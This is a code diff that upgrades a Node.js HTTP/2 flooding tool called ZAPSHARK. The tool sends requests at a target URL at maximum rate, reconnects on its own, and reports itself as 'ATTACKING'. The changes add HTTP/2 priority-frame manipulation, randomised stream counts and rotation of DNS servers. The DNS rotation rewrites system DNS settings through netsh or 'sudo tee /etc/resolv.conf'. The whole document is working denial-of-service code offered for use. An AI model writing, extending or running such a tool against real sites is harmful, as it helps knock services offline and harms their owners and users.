@@ -1,6 +1,7 @@
 const http2 = require('http2');
 const os = require('os');
 const { exec } = require('child_process');
+const dns = require('dns');
 
 class ZAPSHARK {
     constructor(targetUrl) {
@@ -15,27 +16,82 @@ class ZAPSHARK {
         
         // Maintenance
         this.lastMaintenance = Date.now();
-        this.maintenanceInterval = 3600000; // 1 hour
-        this.maintenanceDuration = 600000;  // 10 minutes
+        this.maintenanceInterval = 3600000;
+        this.maintenanceDuration = 600000;
+        
+        // DNS Rotation
+        this.dnsServers = [
+            '8.8.8.8',     // Google
+            '1.1.1.1',     // Cloudflare
+            '9.9.9.9',     // Quad9
+            '208.67.222.222', // OpenDNS
+            '76.76.2.0',   // Alternate DNS
+            '94.140.14.14' // AdGuard
+        ];
+        this.currentDnsIndex = 0;
+        this.dnsRotateInterval = 30000; // Rotate every 30 seconds
+        
+        // HTTP/2 Streams
+        this.maxStreams = this.getRandomStreamCount();
+        this.activeStreams = 0;
         
         this.client = null;
         this.attackInterval = null;
         this.isClientConnected = false;
     }
 
+    getRandomStreamCount() {
+        return Math.floor(Math.random() * 6) + 2; // 2-7 streams
+    }
+
+    rotateDNS() {
+        this.currentDnsIndex = (this.currentDnsIndex + 1) % this.dnsServers.length;
+        const newDns = this.dnsServers[this.currentDnsIndex];
+        
+        // Set DNS for OS (requires admin on some systems)
+        try {
+            if (os.platform() === 'win32') {
+                exec(`netsh interface ip set dns name="Local Area Connection" source=static addr=${newDns}`, () => {});
+            } else {
+                exec(`echo "nameserver ${newDns}" | sudo tee /etc/resolv.conf`, () => {});
+            }
+        } catch (err) {}
+        
+        // Force DNS cache flush
+        dns.setServers([newDns]);
+        
+        console.log(`\n[*] DNS Rotated to: ${newDns}`);
+    }
+
     async setupClient() {
         return new Promise((resolve) => {
             try {
-                this.client = http2.connect(this.targetUrl);
+                // Rotate DNS before connection
+                this.rotateDNS();
+                
+                const options = {
+                    // HTTP/2 Priority Settings
+                    settings: {
+                        headerTableSize: 4096,
+                        enablePush: false,
+                        initialWindowSize: 65535,
+                        maxFrameSize: 16384,
+                        maxConcurrentStreams: this.maxStreams,
+                        maxHeaderListSize: 32768
+                    }
+                };
+                
+                this.client = http2.connect(this.targetUrl, options);
                 
                 this.client.on('connect', () => {
                     this.isClientConnected = true;
+                    this.maxStreams = this.getRandomStreamCount();
+                    console.log(`[*] HTTP/2 Connected - Max Streams: ${this.maxStreams}`);
                     resolve(true);
                 });
                 
                 this.client.on('error', (err) => {
                     this.isClientConnected = false;
-                    // Silent fail - auto reconnect
                     setTimeout(() => this.setupClient(), 1000);
                     resolve(false);
                 });
@@ -54,38 +110,56 @@ class ZAPSHARK {
     }
 
     sendRequest() {
-        if (!this.client || !this.isClientConnected) {
+        if (!this.client || !this.isClientConnected || this.activeStreams >= this.maxStreams) {
             return;
         }
 
         try {
+            this.activeStreams++;
+            
+            // Random priority for HTTP/2 frames (1-256, higher = more priority)
+            const randomPriority = Math.floor(Math.random() * 256) + 1;
+            
             const req = this.client.request({
                 ':method': 'GET',
-                ':path': '/'
+                ':path': '/',
+                ':scheme': 'https',
+                ':authority': new URL(this.targetUrl).hostname
+            }, {
+                weight: randomPriority,
+                exclusive: false,
+                parent: 0
             });
             
-            req.on('response', () => {
-                // Success - destroy stream
+            // Set HTTP/2 priority frame
+            req.priority({
+                weight: randomPriority,
+                exclusive: Math.random() > 0.5,
+                parent: 0
+            });
+            
+            req.on('response', (headers) => {
                 req.destroy();
+                this.activeStreams--;
             });
             
             req.on('error', () => {
-                // Silent fail - just destroy
                 req.destroy();
+                this.activeStreams--;
             });
             
             req.on('close', () => {
-                // Count regardless of success/failure
                 this.totalRequests++;
                 this.requestsSinceLastCalc++;
+                this.activeStreams = Math.max(0, this.activeStreams - 1);
             });
             
             req.end();
             
         } catch (err) {
-            // Count failed attempts too
             this.totalRequests++;
             this.requestsSinceLastCalc++;
+            this.activeStreams = Math.max(0, this.activeStreams - 1);
         }
     }
 
@@ -112,7 +186,9 @@ class ZAPSHARK {
         
         process.stdout.write(`\rZAP-SHARK: (${this.formatRuntime()}) | (${this.status}) ` +
                            `TOTAL: ${this.totalRequests} | ` +
-                           `RPS: ${this.currentRPS.toFixed(1)}`);
+                           `RPS: ${this.currentRPS.toFixed(1)} | ` +
+                           `STREAMS: ${this.activeStreams}/${this.maxStreams} | ` +
+                           `DNS: ${this.dnsServers[this.currentDnsIndex].split('.')[0]}`);
     }
 
     flushDNS() {
@@ -131,7 +207,6 @@ class ZAPSHARK {
             } catch (err) {}
             this.client = null;
         }
-        // Reconnect after flush
         setTimeout(() => this.setupClient(), 100);
     }
 
@@ -146,13 +221,11 @@ class ZAPSHARK {
             this.flushDNS();
             this.flushSockets();
             
-            // Clear attack interval
             if (this.attackInterval) {
                 clearInterval(this.attackInterval);
                 this.attackInterval = null;
             }
             
-            // Resume after 10 minutes
             setTimeout(() => {
                 this.resumeAttack();
             }, this.maintenanceDuration);
@@ -169,7 +242,6 @@ class ZAPSHARK {
     }
 
     startAttack() {
-        // Max RPS - minimal delay
         if (this.attackInterval) {
             clearInterval(this.attackInterval);
         }
@@ -179,18 +251,16 @@ class ZAPSHARK {
                 this.sendRequest();
                 this.updateDisplay();
             }
-        }, 0.1); // Minimal delay for max RPS
+        }, 0.1);
     }
 
     async start() {
-        console.log("=== ZAP-SHARK INITIATED ===");
-        console.log("Protocol: HTTP/2");
-        console.log("Mode: High RPS (Pure Resources)");
-        console.log("Maintenance: Auto 10min every hour");
+        console.log("=== ZAP-SHARK ENHANCED ===");
+        console.log("Protocol: HTTP/2 + DNS Rotation + Priority Frames");
+        console.log("Streams: Dynamic 2-7 | DNS: 6 Servers");
         console.log("Target:", this.targetUrl);
-        console.log("=".repeat(40));
+        console.log("=".repeat(50));
         
-        // Setup client first
         await this.setupClient();
         
         this.startAttack();
@@ -200,14 +270,21 @@ class ZAPSHARK {
             this.checkMaintenance();
         }, 1000);
         
-        // Auto-reconnect checker
+        // DNS rotation every 30 seconds
+        setInterval(() => {
+            if (this.status === "ATTACKING") {
+                this.rotateDNS();
+                this.maxStreams = this.getRandomStreamCount();
+            }
+        }, this.dnsRotateInterval);
+        
+        // Auto-reconnect
         setInterval(() => {
             if (!this.isClientConnected && this.status === "ATTACKING") {
                 this.setupClient();
             }
         }, 2000);
         
-        // Handle exit
         process.on('SIGINT', () => {
             this.stop();
         });
@@ -228,7 +305,7 @@ class ZAPSHARK {
     }
 }
 
-// Usage with error handling
+// Usage
 const target = process.argv[2] || 'https://example.com';
 
 if (!target.startsWith('https://')) {
